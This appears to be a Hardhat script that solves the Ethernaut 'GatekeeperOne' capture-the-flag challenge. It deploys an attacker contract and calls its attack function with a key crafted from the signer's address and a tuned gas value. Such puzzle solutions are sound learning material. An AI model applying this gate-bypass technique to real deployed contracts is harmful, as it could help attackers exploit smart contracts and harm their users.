const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const GatekeeperOneHacker = await ethers.getContractFactory("GatekeeperOneHacker");
  const gatekeeper_one_hacker = await GatekeeperOneHacker.deploy();
  await gatekeeper_one_hacker.deployed();
  console.log(`GatekeeperOneHacker deployed at ${gatekeeper_one_hacker.address}`);

  const gateKeeperOneAddr = process.env.GATEKEEPER_ONE_ADDR;
  const txOrigin = (await ethers.getSigners())[0].address;
  console.log(`txOrigin: ${txOrigin}`);
  const key = `0x112233440000${txOrigin.slice(38)}`;
  console.log(`key: ${key}`);
  const tryGas = 901264;
  let tx = await gatekeeper_one_hacker.attack(gateKeeperOneAddr, key, tryGas, {
    gasLimit: 1000000,
  });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
